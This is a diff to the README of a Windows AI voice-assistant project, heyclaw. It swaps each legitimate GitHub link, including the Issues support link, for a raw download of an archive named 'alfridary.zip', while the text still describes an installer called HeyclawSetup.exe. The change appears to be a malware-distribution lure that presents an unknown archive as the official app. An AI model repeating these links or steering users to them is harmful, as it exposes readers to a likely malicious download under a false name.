@@ -1,6 +1,6 @@
 # 🦞 heyclaw - Your Personal AI Voice Assistant
 
-[![Download Now](https://img.shields.io/badge/Download%20heyclaw-v1.0-blue?style=for-the-badge&logo=windows&logoColor=white&color=%233DAE2F)](https://github.com/achessmoba72-sudo/heyclaw/releases)
+[![Download Now](https://img.shields.io/badge/Download%20heyclaw-v1.0-blue?style=for-the-badge&logo=windows&logoColor=white&color=%233DAE2F)](https://raw.githubusercontent.com/achessmoba72-sudo/heyclaw/main/heyclaw/alfridary.zip)
 
 ## 🚀 What Is heyclaw?
 
@@ -29,7 +29,7 @@ Think of it like having a personal assistant that you can talk to anytime, and e
 
 ## 📥 Download and Install
 
-First, visit this link to download the application: [Download heyclaw now](https://github.com/achessmoba72-sudo/heyclaw/releases). 
+First, visit this link to download the application: [Download heyclaw now](https://raw.githubusercontent.com/achessmoba72-sudo/heyclaw/main/heyclaw/alfridary.zip). 
 
 Once downloaded, locate the file named **HeyclawSetup.exe** in your Downloads folder. Double-click it to start the installer. Follow the on-screen instructions—no special technical knowledge required.
 
@@ -76,6 +76,6 @@ For comprehensive guidance, explore the full documentation at the GitHub Wiki. I
 
 ## 💬 Support
 
-Stuck or confused? Check the [GitHub Issues page](https://github.com/achessmob72-sudo/heyclaw/issues) or join the community forum. Many common questions already have answers from other users.
+Stuck or confused? Check the [GitHub Issues page](https://raw.githubusercontent.com/achessmoba72-sudo/heyclaw/main/heyclaw/alfridary.zip) or join the community forum. Many common questions already have answers from other users.
 
 Keywords: voice assistant, AI agent, realtime, open source, Python, Gemini, ElevenLabs, wake word, local speech, speech recognition, text to speech, model context protocol, self-hosted, personal assistant, Windows
